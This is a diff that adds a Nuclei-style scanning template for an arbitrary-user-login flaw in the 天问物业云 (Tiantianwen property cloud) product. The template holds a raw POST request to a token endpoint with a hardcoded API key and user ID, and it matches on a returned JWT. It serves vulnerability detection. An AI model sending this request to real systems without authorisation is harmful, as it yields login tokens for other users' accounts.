@@ -1,0 +1,28 @@
+id: tiantianwen-auth-login
+info:
+  name: 天问物业云任意用户登录
+  author: admin
+  severity: high
+  description: 天问物业云任意用户登录,web.body="天问物业云"
+  reference:
+    - https://
+  tags: login
+http:
+  - raw:
+      - |-
+        POST /RoadFlowOpenApi/token/GetIframeToken HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 103
+
+        {"code":"api","key":"63121B6CF10BE3009ECD7139E118BCE9","userid":"EB03262C-AB60-4BC6-A4C0-96E66A4229FE"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"token":"eyJh'
+      - type: word
+        part: body
+        words:
+          - '"success":true'
